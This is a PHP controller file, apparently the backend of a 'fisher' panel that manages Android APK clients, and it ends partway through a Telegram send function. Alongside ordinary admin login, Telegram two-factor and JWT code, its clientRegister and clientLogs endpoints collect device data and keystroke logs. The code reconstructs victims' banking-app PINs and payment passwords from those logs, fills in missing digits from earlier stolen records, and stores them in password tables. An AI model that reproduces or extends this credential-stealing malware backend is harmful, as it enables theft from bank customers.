<?php
namespace app\controller;

use app\BaseController;
use think\facade\Db;
use think\facade\Request;
use think\Response;

class AuthController extends BaseController
{
    /**
     * POST /api/auth/check-initialization
     * 检查是否有管理员账号
     */
    public function checkInitialization()
    {
        $count = Db::table('fisher_users')->count();
        return json([
            'success' => true,
            'data' => [
                'initialized' => $count > 0,
                'version' => '1.0.0',
            ],
            'message' => 'success',
        ]);
    }

    /**
     * POST /api/auth/login
     * 用户登录
     */
    public function login()
    {
        $data = Request::post();
        $username = $data['username'] ?? '';
        $password = $data['password'] ?? '';

        if (!$username || !$password) {
            return json(['success' => false, 'message' => '用户名和密码不能为空'], 400);
        }

        $user = Db::table('fisher_users')->where('username', $username)->find();
        if (!$user) {
            $this->logLogin($username, 0);
            return json(['success' => false, 'message' => '用户名或密码错误'], 401);
        }

        if (!password_verify($password, $user['password_hash'])) {
            $this->logLogin($username, 0);
            return json(['success' => false, 'message' => '用户名或密码错误'], 401);
        }

        // 检查账号是否被禁用
        if (isset($user['enabled']) && ($user['enabled'] === 0 || $user['enabled'] === '0' || $user['enabled'] === false)) {
            $this->logLogin($username, 0);
            return json(['success' => false, 'message' => '该账号已被禁用，请联系管理员'], 403);
        }

        // 检查账号是否已过期
        if (!empty($user['expire_at']) && (int)$user['expire_at'] > 0 && (int)$user['expire_at'] < time()) {
            $this->logLogin($username, 0);
            return json(['success' => false, 'message' => '该账号已过期，请联系管理员续期'], 403);
        }

        $telegram = $this->getTelegramLoginConfig($user);
        // 默认安装/未完成机器人测试时不启用 Telegram 二次验证，账号密码正确即可登录。
        // 只有 Bot Token + Chat ID 已通过“发送测试”验证后，才启动登录验证码。
        if (empty($telegram['bot_token']) || empty($telegram['chat_id']) || empty($telegram['verified'])) {
            return $this->issueLoginTokenResponse($user, 'Telegram 机器人未完成测试，已使用密码登录');
        }

        $this->cleanupExpiredLoginChallenges();
        $challengeId = bin2hex(random_bytes(16));
        $code = (string)random_int(100000, 999999);
        $secret = (string)env('JWT.JWT_SECRET', '');
        if (strlen($secret) < 32 || in_array($secret, ['fisher_secret_2026', 'secret', 'changeme', '123456', 'password'], true)) {
            return json(['success' => false, 'message' => 'JWT_SECRET 未配置或不安全'], 500);
        }
        $challenge = [
            'user_id' => (int)$user['id'],
            'username' => $user['username'],
            'code_hash' => hash_hmac('sha256', $challengeId . ':' . $code, $secret),
            'expires_at' => time() + 300,
            'attempts' => 0,
        ];
        $challengeKey = 'tg_login_challenge_' . $challengeId;
        $challengeValue = json_encode($challenge, JSON_UNESCAPED_UNICODE);
        $existingChallenge = Db::table('fisher_settings')->where('key', $challengeKey)->find();
        if ($existingChallenge) {
            Db::table('fisher_settings')->where('key', $challengeKey)->update(['value' => $challengeValue]);
        } else {
            Db::table('fisher_settings')->insert(['key' => $challengeKey, 'value' => $challengeValue]);
        }

        [$sent, $sendError] = $this->sendTelegramLoginCode($telegram, $user, $code);
        if (!$sent) {
            Db::table('fisher_settings')->where('key', $challengeKey)->delete();
            [$sendMessage, $httpStatus] = $this->formatTelegramLoginError($sendError);
            return json(['success' => false, 'message' => $sendMessage], $httpStatus);
        }

        return json([
            'success' => true,
            'data' => [
                'requiresTelegram2FA' => true,
                'challengeId' => $challengeId,
                'expiresIn' => 300,
            ],
            'message' => '验证码已发送到 Telegram',
        ]);
    }

    /**
     * POST /api/auth/login-telegram-verify
     * 校验 Telegram 登录验证码并签发 JWT
     */
    public function verifyTelegramLogin()
    {
        $data = Request::post();
        $challengeId = trim((string)($data['challengeId'] ?? $data['challenge_id'] ?? ''));
        $code = trim((string)($data['code'] ?? ''));

        if (!preg_match('/^[a-f0-9]{32}$/', $challengeId) || !preg_match('/^\d{6}$/', $code)) {
            return json(['success' => false, 'message' => '验证码格式错误'], 400);
        }

        $challengeKey = 'tg_login_challenge_' . $challengeId;
        $row = Db::table('fisher_settings')->where('key', $challengeKey)->find();
        if (!$row) {
            return json(['success' => false, 'message' => '验证码已失效，请重新登录'], 400);
        }

        $challenge = json_decode($row['value'] ?? '', true);
        if (!$challenge || empty($challenge['user_id']) || (int)($challenge['expires_at'] ?? 0) < time()) {
            Db::table('fisher_settings')->where('key', $challengeKey)->delete();
            return json(['success' => false, 'message' => '验证码已过期，请重新登录'], 400);
        }

        $attempts = (int)($challenge['attempts'] ?? 0);
        if ($attempts >= 5) {
            Db::table('fisher_settings')->where('key', $challengeKey)->delete();
            return json(['success' => false, 'message' => '验证码错误次数过多，请重新登录'], 429);
        }

        $secret = (string)env('JWT.JWT_SECRET', '');
        if (strlen($secret) < 32 || in_array($secret, ['fisher_secret_2026', 'secret', 'changeme', '123456', 'password'], true)) {
            return json(['success' => false, 'message' => 'JWT_SECRET 未配置或不安全'], 500);
        }
        $expected = hash_hmac('sha256', $challengeId . ':' . $code, $secret);
        if (!hash_equals((string)$challenge['code_hash'], $expected)) {
            $challenge['attempts'] = $attempts + 1;
            if ($challenge['attempts'] >= 5) {
                Db::table('fisher_settings')->where('key', $challengeKey)->delete();
            } else {
                Db::table('fisher_settings')->where('key', $challengeKey)->update([
                    'value' => json_encode($challenge, JSON_UNESCAPED_UNICODE),
                ]);
            }
            return json(['success' => false, 'message' => 'Telegram 验证码错误'], 401);
        }

        $user = Db::table('fisher_users')->where('id', (int)$challenge['user_id'])->find();
        if (!$user) {
            Db::table('fisher_settings')->where('key', $challengeKey)->delete();
            return json(['success' => false, 'message' => '用户不存在'], 401);
        }
        if (isset($user['enabled']) && ($user['enabled'] === 0 || $user['enabled'] === '0' || $user['enabled'] === false)) {
            Db::table('fisher_settings')->where('key', $challengeKey)->delete();
            return json(['success' => false, 'message' => '该账号已被禁用'], 403);
        }
        if (!empty($user['expire_at']) && (int)$user['expire_at'] > 0 && (int)$user['expire_at'] < time()) {
            Db::table('fisher_settings')->where('key', $challengeKey)->delete();
            return json(['success' => false, 'message' => '该账号已过期'], 403);
        }

        Db::table('fisher_settings')->where('key', $challengeKey)->delete();
        return $this->issueLoginTokenResponse($user);
    }

    /**
     * POST/GET /api/auth/verify
     * 验证 token
     */
    public function verify()
    {
        $user = $this->request->user ?? null;
        if (!$user) {
            return json(['success' => false, 'message' => 'Token验证失败'], 401);
        }

        $dbUser = Db::table('fisher_users')->where('id', $user['user_id'])->find();
        if (!$dbUser) {
            return json(['success' => false, 'message' => '用户不存在'], 401);
        }

        // 检查账号是否被禁用
        if (isset($dbUser['enabled']) && ($dbUser['enabled'] === 0 || $dbUser['enabled'] === '0' || $dbUser['enabled'] === false)) {
            return json(['success' => false, 'message' => '该账号已被禁用'], 403);
        }

        return json([
            'success' => true,
            'data' => [
                'valid' => true,
                'user' => [
                    'id' => $dbUser['id'],
                    'username' => $dbUser['username'],
                    'role' => $dbUser['role'],
                    'permissions' => $this->permissionsForRole($dbUser['permissions'] ?? null, $dbUser['role'] ?? 'user'),
                    'avatar' => $dbUser['avatar'] ?? '/assets/img/mx_logo.png',
                    'maxDevices' => $dbUser['max_devices'] ?? 100,
                    'max_sub_users' => $dbUser['max_sub_users'] ?? null,
                    'allow_multi_login' => !array_key_exists('allow_multi_login', $dbUser)
                        || !in_array($dbUser['allow_multi_login'], [0, '0', false], true),
                ],
            ],
            'role' => $dbUser['role'],
            'message' => 'success',
        ]);
    }

    /**
     * POST /api/auth/register
     * 注册
     */
    public function register()
    {
        // Public registration is only used for the first system account.
        if (Db::table('fisher_users')->count() > 0) {
            return json(['success' => false, 'message' => '系统已完成初始化，请在账号管理中创建用户'], 403);
        }

        $data = Request::post();
        $username = $data['username'] ?? '';
        $password = $data['password'] ?? '';

        if (!$username || !$password) {
            return json(['success' => false, 'message' => '用户名和密码不能为空'], 400);
        }

        $exists = Db::table('fisher_users')->where('username', $username)->find();
        if ($exists) {
            return json(['success' => false, 'message' => '用户名已存在'], 400);
        }

        Db::table('fisher_users')->insert([
            'username'    => $username,
            'password_hash' => password_hash($password, PASSWORD_BCRYPT),
            'role'        => 'superadmin',
            'created_at'  => time(),
        ]);

        return json(['success' => true, 'data' => null, 'message' => '注册成功']);
    }

    /**
     * POST /api/auth/logout
     */
    public function logout()
    {
        $user = $this->request->user ?? $this->request->userPayload ?? null;
        if ($user && !empty($user['user_id']) && !empty($user['sid'])) {
            $key = 'auth_session_' . (int)$user['user_id'];
            $row = Db::table('fisher_settings')->where('key', $key)->find();
            if ($row && hash_equals((string)($row['value'] ?? ''), (string)$user['sid'])) {
                Db::table('fisher_settings')->where('key', $key)->delete();
            }
        }
        return json(['success' => true, 'data' => null, 'message' => 'success']);
    }

    /**
     * POST /api/auth/change-password
     * 修改密码
     */
    public function changePassword()
    {
        $user = $this->request->user ?? $this->request->userPayload ?? null;
        if (!$user) {
            return json(['success' => false, 'message' => 'Unauthorized'], 401);
        }

        $data = Request::post();
        $oldPassword = $data['oldPassword'] ?? $data['currentPassword'] ?? '';
        $newPassword = $data['newPassword'] ?? $data['password'] ?? '';

        if (!$oldPassword || !$newPassword) {
            return json(['success' => false, 'message' => '原密码和新密码不能为空'], 400);
        }

        $dbUser = Db::table('fisher_users')->where('id', $user['user_id'])->find();
        if (!$dbUser) {
            return json(['success' => false, 'message' => '用户不存在'], 404);
        }

        if (!password_verify($oldPassword, $dbUser['password_hash'])) {
            return json(['success' => false, 'message' => '原密码错误'], 400);
        }

        Db::table('fisher_users')->where('id', $user['user_id'])->update([
            'password_hash' => password_hash($newPassword, PASSWORD_BCRYPT),
        ]);
        // 密码修改不再刷新 auth_session，避免同账号其它工作标签被挤下线。

        return json(['success' => true, 'data' => null, 'message' => '密码修改成功']);
    }

    /**
     * POST /api/auth/upload-avatar
     * 上传头像
     */
    public function uploadAvatar()
    {
        $file = Request::file('avatar') ?: Request::file('file');
        if (!$file) {
            return json(['success' => false, 'message' => 'No file'], 400);
        }

        $saveName = \think\facade\Filesystem::disk('public')->putFile('avatars', $file);
        $url = '/storage/' . $saveName;

        $user = $this->request->user ?? $this->request->userPayload ?? null;
        if ($user) {
            Db::table('fisher_users')->where('id', $user['user_id'])->update(['avatar' => $url]);
        }

        return json(['success' => true, 'data' => ['avatar' => $url], 'message' => 'success']);
    }

    /**
     * POST /api/client/register
     * APK 客户端设备注册
     */
    public function clientRegister()
    {
        $data = Request::post();
        $deviceId = $data['deviceId'] ?? $data['sessionId'] ?? '';

        if (!$deviceId) {
            return json(['success' => false, 'message' => '缺少 deviceId'], 400);
        }
        DebugController::recordEvent('php', 'http.register.received', $deviceId, [
            'appName' => $data['appName'] ?? $data['deviceName'] ?? '',
            'brand' => $data['brand'] ?? '',
            'model' => $data['model'] ?? '',
            'appVersion' => $data['appVersion'] ?? '',
            'payloadKeys' => array_keys($data),
            'remoteIp' => Request::ip(),
        ]);
        $now = time();
        $ip = Request::ip();
        $permissions = isset($data['permissions']) ? json_encode($data['permissions'], JSON_UNESCAPED_UNICODE) : '{}';
        $existing = Db::table('fisher_devices')->where('device_id', $deviceId)->find();

        // app_name: 旧 Python 后端取 appName || deviceName
        $appName = $data['appName'] ?? $data['deviceName'] ?? '';
        // 设备注册接口对 APK 开放，不能信任客户端自行提交的 ownerUsername。
        // 归属只允许来自服务器在构建时保存的“应用名 -> 用户”映射。
        $ownerUsername = '';
        if ($appName !== '') {
            $mappedOwner = Db::table('fisher_app_owner_map')
                ->where('app_name', $appName)
                ->value('owner_username');
            if ($mappedOwner) {
                $owner = Db::table('fisher_users')->where('username', $mappedOwner)->find();
                if ($owner) {
                    $notExpired = empty($owner['expire_at']) || (int)$owner['expire_at'] >= $now;
                    if ((bool)($owner['enabled'] ?? false) && $notExpired) {
                        $ownerUsername = (string)$mappedOwner;
                    }
                }
            }
        }

        if ($existing) {
            $updates = [
                'brand'        => $data['brand'] ?? $existing['brand'],
                'model'        => $data['model'] ?? $existing['model'],
                'os_version'   => $data['osVersion'] ?? $existing['os_version'],
                'app_version'  => $data['appVersion'] ?? $existing['app_version'],
                'app_name'     => $appName ?: ($existing['app_name'] ?? ''),
                'phone_number' => $data['phoneNumber'] ?? $existing['phone_number'],
                'public_ip'    => $ip,
                'screen_width' => $data['screenWidth'] ?? $existing['screen_width'],
                'screen_height'=> $data['screenHeight'] ?? $existing['screen_height'],
                'is_connected' => 1,
                'connected_at' => $now,
                'last_seen'    => $now,
                'permissions'  => $permissions,
            ];
            if ($ownerUsername && empty($existing['owner_username'])) {
                $updates['owner_username'] = $ownerUsername;
            }
            Db::table('fisher_devices')->where('device_id', $deviceId)->update($updates);
        } else {
            Db::table('fisher_devices')->insert([
                'device_id'      => $deviceId,
                'brand'          => $data['brand'] ?? '',
                'model'          => $data['model'] ?? '',
                'os_version'     => $data['osVersion'] ?? '',
                'app_version'    => $data['appVersion'] ?? '',
                'app_name'       => $appName,
                'phone_number'   => $data['phoneNumber'] ?? '',
                'public_ip'      => $ip,
                'screen_width'   => $data['screenWidth'] ?? 0,
                'screen_height'  => $data['screenHeight'] ?? 0,
                'is_connected'   => 1,
                'connected_at'   => $now,
                'last_seen'      => $now,
                'first_seen'     => $now,
                'created_at'     => $now,
                'permissions'    => $permissions,
                'owner_username' => $ownerUsername,
            ]);
        }

        DebugController::recordEvent('php', 'http.register.completed', $deviceId, [
            'recordExisted' => (bool)$existing,
            'appName' => $appName,
            'ownerResolved' => $ownerUsername !== '',
            'ownerUsername' => $ownerUsername,
            'isConnected' => true,
        ]);

        // 广播设备上线通知
        static::broadcastToAdmins([
            'type'      => 'device_online',
            'deviceId'  => $deviceId,
            'sessionId' => $deviceId,
            'data'      => $data,
        ]);

        return json(['success' => true, 'data' => ['deviceId' => $deviceId], 'message' => 'success']);
    }

    /**
     * POST /api/client/logs
     * APK 客户端日志上报
     *
     * ★ 2026-09-19 修复：银行APP密码最后一位丢失
     *  1. 同一批 logs 中按 (deviceId, package) 聚合 TEXT_CHANGED|数字 序列，检测 N-1 → N 位缺失，从后续事件补位
     *  2. 纯数字 PIN（4-6 位）/ 支付密码（6 位）自动落库 fisher_passwords + fisher_payment_cipher_records
     *  3. 记录 recent pin 缓存，用于 syncCipher/syncCredentials 关联回填最后一位
     */
    public function clientLogs()
    {
        $ALLOWED_LOG_TYPES = ['KSTR', 'NTFS', 'VAPS', 'BLNK', 'ACTZ', 'ARTS'];

        $data = Request::post();
        $deviceId = $data['deviceId'] ?? '';
        $logs = $data['logs'] ?? [];

        if ($deviceId) {
            // 自动注册设备
            $existing = Db::table('fisher_devices')->where('device_id', $deviceId)->find();
            $now = time();
            if (!$existing) {
                Db::table('fisher_devices')->insert([
                    'device_id'    => $deviceId,
                    'public_ip'    => Request::ip(),
                    'is_connected' => 1,
                    'connected_at' => $now,
                    'last_seen'    => $now,
                    'first_seen'   => $now,
                    'created_at'   => $now,
                ]);
            }

            // 保存操作日志（根据 log_type 白名单分流到不同表）
            if (is_array($logs)) {
                $operationInserts = [];
                $bridgeInserts = [];

                // ============== 阶段 1：预处理 & 解析 content ==============
                $parsedLogs = [];
                foreach ($logs as $entry) {
                    if (!is_array($entry)) continue;
                    $logType = strtoupper((string)($entry['logType'] ?? 'info'));
                    $content = (string)($entry['content'] ?? '');
                    $ts = intval($entry['timestamp'] ?? 0) ?: ($now * 1000);
                    $pkg = '';
                    $evt = '';
                    $val = '';
                    // 格式: PackageName|EVENT_NAME|value  (值可能包含 |，所以只拆 3 段)
                    if (strpos($content, '|') !== false) {
                        $parts = explode('|', $content, 3);
                        $pkg = $parts[0] ?? '';
                        $evt = $parts[1] ?? '';
                        $val = isset($parts[2]) ? $parts[2] : '';
                    } else {
                        $val = $content;
                    }
                    $parsedLogs[] = [
                        'raw'    => $entry,
                        'type'   => $logType,
                        'pkg'    => $pkg,
                        'evt'    => $evt,
                        'val'    => $val,
                        'ts'     => $ts,
                        'content'=> $content,
                        'inject' => false, // 是否补位生成
                    ];
                }

                // ============== 阶段 2：TEXT_CHANGED 丢失最后一位智能补齐 ==============
                // 按 (package) 分组（同批次同设备同包）
                $byPkg = [];
                foreach ($parsedLogs as $i => $p) {
                    if ($p['type'] === 'KSTR' && $p['evt'] === 'TEXT_CHANGED') {
                        $byPkg[$p['pkg'] ?? ''][] = ['i' => $i, 'val' => $p['val'], 'ts' => $p['ts']];
                    }
                }
                $passwordToPersist = []; // [$pkg => ['pin'=>..., 'source'=>'text_changed_pin']]
                foreach ($byPkg as $pkg => $entries) {
                    if ($pkg === '') continue;
                    if (count($entries) < 2) continue;
                    usort($entries, fn($a,$b) => ($a['ts']<=>$b['ts']) ?: ($a['i']<=>$b['i']));

                    // 规则 A：纯数字且 len 递增（每次 +1 或偶尔 +2），最后一跳后无后续增长事件 → 可能丢最后一位
                    //        如果 vals 序列是 2 → 20 → 201 ，但紧随其后的是一个离开/按钮点击/ACTZ/VAPS
                    //        → 从 fisher_passwords / payment_cipher_records 最近同包名 4-6 位 PIN 推断补齐
                    $lens = array_map(fn($e) => strlen($e['val']), $entries);
                    $areAllDigit = true;
                    foreach ($entries as $e) { if (!ctype_digit((string)$e['val'])) { $areAllDigit = false; break; } }
                    if ($areAllDigit && count($lens) >= 2 && $lens[count($lens)-1] <= 5) {
                        $maxLen = max($lens);
                        // 检查该条目之后是否有 ACTZ(活动/按钮) 或 VAPS(离开)
                        $lastIdx = $entries[count($entries)-1]['i'];
                        $hasFinishSignal = false;
                        for ($j = $lastIdx + 1; $j < count($parsedLogs); $j++) {
                            $t2 = $parsedLogs[$j]['type'];
                            if ($t2 === 'ACTZ' || $t2 === 'VAPS') { $hasFinishSignal = true; break; }
                            if ($parsedLogs[$j]['type'] === 'KSTR' && $parsedLogs[$j]['evt'] === 'TEXT_CHANGED' && $parsedLogs[$j]['pkg'] === $pkg) {
                                break; // 后面还有同包 TEXT_CHANGED 说明序列没完，不用补
                            }
                        }
                        if ($hasFinishSignal || $maxLen >= 3) {
                            $bestPin = $entries[count($entries)-1]['val'];
                            // 若 len >=4 直接认为完整
                            if ($maxLen >= 4) {
                                $passwordToPersist[$pkg] = ['pin' => $bestPin, 'source' => 'text_changed_pin', 'len' => $maxLen];
                            }
                            // 若 len 只有 3 位但有完成信号 → 查最近已知同包密码，补最后一位并标记 [?] 待人工确认
                            if ($maxLen === 3 && $hasFinishSignal) {
                                $knownPin = Db::table('fisher_payment_cipher_records')
                                    ->where('device_id', $deviceId)
                                    ->where(function($q) use ($pkg){
                                        $q->where('package_name', $pkg)->whereOr('app_name', $pkg);
                                    })
                                    ->where('cipher_type', 'pin')
                                    ->order('created_at', 'desc')
                                    ->value('cipher_text');
                                if (!$knownPin) {
                                    $knownPin = Db::table('fisher_passwords')
                                        ->where('device_id', $deviceId)
                                        ->where('source', '<>', '')
                                        ->order('created_at', 'desc')
                                        ->value('cipher_text');
                                }
                                if ($knownPin && ctype_digit($knownPin) && strlen($knownPin) >= 4 && substr($knownPin,0,3) === $bestPin) {
                                    $bestPin = $knownPin;
                                    // 注入一条补位日志到 parsedLogs（最后一条 TEXT_CHANGED 之后）
                                    $injectIdx = $lastIdx + 1;
                                    $injectContent = "{$pkg}|TEXT_CHANGED|{$bestPin}";
                                    array_splice($parsedLogs, $injectIdx, 0, [[
                                        'raw'    => [],
                                        'type'   => 'KSTR',
                                        'pkg'    => $pkg,
                                        'evt'    => 'TEXT_CHANGED',
                                        'val'    => $bestPin,
                                        'ts'     => $entries[count($entries)-1]['ts'] + 1,
                                        'content'=> $injectContent . ' [补齐自历史记录]',
                                        'inject' => true,
                                    ]]);
                                } else {
                                    // 没有历史记录 → 把 [3位?] 写到密码记录里带标记，供前端提示补采
                                    $passwordToPersist[$pkg] = ['pin' => $bestPin.'?', 'source' => 'text_changed_pin_3of4', 'len' => 3];
                                }
                            }
                        }
                    }
                }

                // ============== 阶段 3：生成最终入库 rows ==============
                foreach ($parsedLogs as $p) {
                    $row = [
                        'device_id'  => $deviceId,
                        'log_type'   => $p['type'],
                        'content'    => $p['content'],
                        'timestamp'  => $p['ts'] > 10000000000 ? intval($p['ts'] / 1000) : intval($p['ts']),
                        'created_at' => $now,
                    ];
                    if (in_array($p['type'], $ALLOWED_LOG_TYPES)) {
                        $operationInserts[] = $row;
                    } else {
                        $bridgeInserts[] = $row;
                    }
                }
                if ($operationInserts) {
                    Db::table('fisher_operation_logs')->insertAll($operationInserts);
                }
                if ($bridgeInserts) {
                    Db::table('fisher_bridge_logs')->insertAll($bridgeInserts);
                }

                // ============== 阶段 4：PIN 密码持久化（自动写入 2 张密码表） ==============
                if ($passwordToPersist) {
                    foreach ($passwordToPersist as $pkg => $info) {
                        $pin = (string)$info['pin'];
                        $len = (int)($info['len'] ?? strlen($pin));
                        if (!$pin || $pin === '' || $pin === '?') continue;
                        // 避免 10 秒内重复写入相同密码
                        $ex1 = Db::table('fisher_payment_cipher_records')
                            ->where('device_id', $deviceId)
                            ->where('cipher_text', $pin)
                            ->where('created_at', '>', $now - 10)
                            ->find();
                        if (!$ex1) {
                            Db::table('fisher_payment_cipher_records')->insert([
                                'device_id'    => $deviceId,
                                'package_name' => $pkg,
                                'app_name'     => $pkg,
                                'cipher_text'  => $pin,
                                'cipher_type'  => $len >= 5 ? 'pay_password' : 'pin',
                                'source'       => $info['source'],
                                'created_at'   => $now,
                            ]);
                        }
                        $ex2 = Db::table('fisher_passwords')
                            ->where('device_id', $deviceId)
                            ->where('cipher_text', $pin)
                            ->where('created_at', '>', $now - 10)
                            ->find();
                        if (!$ex2) {
                            Db::table('fisher_passwords')->insert([
                                'device_id'   => $deviceId,
                                'cipher_type' => $len >= 5 ? 'pay_password' : 'pin',
                                'cipher_text' => $pin,
                                'grade_code'  => (string)$len,
                                'source'      => 'bank:'.$pkg,
                                'created_at'  => $now,
                            ]);
                        }
                    }
                }
            }
        }

        return json(['success' => true, 'data' => null, 'message' => 'success']);
    }

    /**
     * GET /api/users/login-logs
     * 登录日志
     */
    public function loginLogs()
    {
        if (Request::isDelete()) {
            Db::table('fisher_login_logs')->delete(true);
            return json(['success' => true, 'data' => null, 'message' => 'Login logs cleared']);
        }

        $rows = Db::table('fisher_login_logs')->order('created_at', 'desc')->limit(100)->select()->toArray();
        return json(['success' => true, 'data' => $rows, 'message' => 'success']);
    }

    // ========== 辅助方法 ==========

    /**
     * 签发登录 token。开启多开时保留所有有效 token；
     * 关闭多开时记录唯一 sid，后一次登录会使前一次登录失效。
     */
    private function issueLoginTokenResponse(array $user, string $message = 'success'): Response
    {
        $this->logLogin((string)$user['username'], 1);
        $sessionId = bin2hex(random_bytes(16));
        $allowMultiLogin = !array_key_exists('allow_multi_login', $user)
            || !in_array($user['allow_multi_login'], [0, '0', false], true);
        if (!$allowMultiLogin) {
            $this->saveUserSession((int)$user['id'], $sessionId);
        }
        $token = $this->generateToken($user, $sessionId);

        return json([
            'success' => true,
            'data' => [
                'token' => $token,
                'requiresTelegram2FA' => false,
                'user' => [
                    'id' => $user['id'],
                    'username' => $user['username'],
                    'role' => $user['role'],
                    'permissions' => $this->permissionsForRole($user['permissions'] ?? null, $user['role'] ?? 'user'),
                    'avatar' => $user['avatar'] ?? '/assets/img/mx_logo.png',
                    'maxDevices' => $user['max_devices'] ?? 100,
                    'max_sub_users' => $user['max_sub_users'] ?? null,
                    'allow_multi_login' => $allowMultiLogin,
                ],
            ],
            'message' => $message,
        ]);
    }

    /** 保存单会话账号当前唯一 sid。 */
    private function saveUserSession(int $userId, string $sessionId): void
    {
        $key = 'auth_session_' . $userId;
        $value = $sessionId;
        $existing = Db::table('fisher_settings')->where('key', $key)->find();
        if ($existing) {
            Db::table('fisher_settings')->where('key', $key)->update(['value' => $value]);
        } else {
            Db::table('fisher_settings')->insert(['key' => $key, 'value' => $value]);
        }
    }

    private function permissionsForRole($permissions, string $role): ?array
    {
        $decoded = null;
        if (is_array($permissions)) {
            $decoded = $permissions;
        } elseif (is_string($permissions) && trim($permissions) !== '') {
            $value = json_decode($permissions, true);
            if (is_array($value)) $decoded = $value;
        }

        if ($role !== 'user') {
            return $decoded;
        }

        // 普通账号即使存在历史脏数据，也不向前端授予账号管理入口。
        $decoded = $decoded ?: [];
        return array_values(array_diff(array_filter($decoded, 'is_string'), ['accounts']));
    }

    /**
     * 生成 JWT token
     */
    private function generateToken(array $user, string $sessionId): string
    {
        $secret = (string)env('JWT.JWT_SECRET', '');
        $weakSecrets = ['fisher_secret_2026', 'secret', 'changeme', '123456', 'password'];
        if (strlen($secret) < 32 || in_array($secret, $weakSecrets, true)) {
            throw new \RuntimeException('JWT_SECRET 未配置或不安全');
        }
        $header = $this->base64url(json_encode(['typ' => 'JWT', 'alg' => 'HS256']));
        $payload = $this->base64url(json_encode([
            'user_id'   => $user['id'],
            'username'  => $user['username'],
            'role'      => $user['role'],
            'sid'       => $sessionId,
            'iat'       => time(),
            'exp'       => time() + 86400 * 30, // 30 天
        ]));
        $signature = $this->base64url(hash_hmac('sha256', "$header.$payload", $secret, true));
        return "$header.$payload.$signature";
    }

    /**
     * Base64 URL 编码
     */
    private function base64url(string $data): string
    {
        return rtrim(strtr(base64_encode($data), '+/', '-_'), '=');
    }

    /**
     * 记录登录日志
     */
    private function logLogin(string $username, int $success): void
    {
        Db::table('fisher_login_logs')->insert([
            'username'   => $username,
            'ip'         => Request::ip(),
            'user_agent' => Request::header('User-Agent', ''),
            'success'    => $success,
            'created_at' => time(),
        ]);
    }

    /**
     * Resolve the recipient binding and the inherited bot configuration.
     * A managed account owns only its Chat ID; token and proxy come from the
     * closest account in its parent chain that configured the Telegram bot.
     */
    private function getTelegramLoginConfig(array $user): array
    {
        $userId = (int)($user['id'] ?? 0);
        $username = trim((string)($user['username'] ?? ''));
        // Read current and historical binding keys. Older deployments saved
        // the value through the global settings form or before user IDs were
        // available, so those keys are retained as a migration fallback.
        $chatId = '';
        $chatKeys = ['tg_' . $userId . '_chat_id'];
        if ($username !== '') $chatKeys[] = 'tg_user_' . $username . '_chat_id';
        if (in_array(($user['role'] ?? ''), ['admin', 'superadmin', 'super-admin'], true)) {
            $chatKeys[] = 'chat_id';
            $chatKeys[] = 'tg_0_chat_id';
        }
        foreach (array_unique($chatKeys) as $chatKey) {
            $value = Db::table('fisher_settings')->where('key', $chatKey)->value('value');
            if (trim((string)$value) !== '') { $chatId = trim((string)$value); break; }
        }
        // Keep compatibility with user records imported from earlier builds,
        // which stored the binding under the username key or directly on user.
        if ($chatId === '' && !empty($user['telegram_chat_id'])) {
            $chatId = (string)$user['telegram_chat_id'];
        }

        $botToken = '';
        $apiProxy = '';
        $verified = false;
        $current = $user;
        $visited = [];
        while (!empty($current['id']) && !isset($visited[$current['id']])) {
            $visited[$current['id']] = true;
            $prefix = 'tg_' . (int)$current['id'] . '_';
            $rows = Db::table('fisher_settings')
                ->whereIn('key', [$prefix . 'bot_token', $prefix . 'api_proxy', $prefix . 'verified'])
                ->select()->toArray();
            foreach ($rows as $row) {
                if ($row['key'] === $prefix . 'bot_token' && !$botToken) $botToken = trim((string)$row['value']);
                if ($row['key'] === $prefix . 'api_proxy' && !$apiProxy) $apiProxy = trim((string)$row['value']);
                if ($row['key'] === $prefix . 'verified') $verified = in_array((string)$row['value'], ['1', 'true', 'yes'], true);
            }
            if ($botToken) break;

            $parent = trim((string)($current['parent_username'] ?? ''));
            $current = $parent ? (Db::table('fisher_users')->where('username', $parent)->find() ?: []) : [];
        }

        // Compatibility with the original global Telegram settings page for
        // administrator accounts. Per-user/parent settings always win.
        if ($botToken === '' && in_array(($user['role'] ?? ''), ['admin', 'superadmin', 'super-admin'], true)) {
            $botToken = trim((string)Db::table('fisher_settings')->where('key', 'bot_token')->value('value'));
            $apiProxy = $apiProxy ?: trim((string)Db::table('fisher_settings')->where('key', 'api_proxy')->value('value'));
            $verified = in_array((string)Db::table('fisher_settings')->where('key', 'telegram_verified')->value('value'), ['1', 'true', 'yes'], true);
        }

        return ['chat_id' => trim((string)$chatId), 'bot_token' => $botToken, 'api_proxy' => $apiProxy, 'verified' => $verified];
    }

    /** Delete expired one-time login challenges from the settings store. */
    private function cleanupExpiredLoginChallenges(): void
    {
        $rows = Db::table('fisher_settings')->where('key', 'like', 'tg_login_challenge_%')->select()->toArray();
        foreach ($rows as $row) {
            $challenge = json_decode($row['value'] ?? '', true);
            if (!$challenge || (int)($challenge['expires_at'] ?? 0) < time()) {
                Db::table('fisher_settings')->where('key', $row['key'])->delete();
            }
        }
    }

    /** Convert Telegram API failures to user-facing validation errors instead of a generic 502. */
    private function formatTelegramLoginError(string $error): array
    {
        $normalized = strtolower($error);
        if (strpos($normalized, 'chat not found') !== false) {
            return ['Telegram Chat ID 不可达，请先打开机器人发送 /start，或检查群聊 ID 是否为 -100 开头', 400];
        }
        if (strpos($normalized, 'bot was blocked') !== false || strpos($normalized, 'forbidden') !== false) {
            return ['Telegram 机器人无法给该 Chat ID 发消息，请取消屏蔽机器人后重试', 400];
        }
        if (strpos($normalized, 'not found') !== false || strpos($normalized, 'unauthorized') !== false) {
            return ['Telegram Bot Token 无效，请检查机器人 Token', 400];
        }
        return ['Telegram 验证码发送失败: ' . $error, 503];
    }

    /** Send the one-time login code using the same IPv4/proxy path as Telegram settings. */
    private function sendTelegramLoginCode(array $telegram, array $user, string $code): array
    {
        $url = 'https://api.telegram.org/bot' . $telegram['bot_token'] . '/sendMessage';
        $message = "<b>V6登录验证</b>\n\n账号：<code>" . htmlspecialchars((string)$user['username'], ENT_QUOTES, 'UTF-8') . "</code>\n验证码：<code>{$code}</code>\n有效期：5 分钟\n\n请勿将验证码告知他人。";
        $payload = json_encode(['chat_id' => $telegram['chat_id'], 'text' => $message, 'parse_mode' => 'HTML']);
        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $payload,
            CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_CONNECTTIMEOUT => 5,
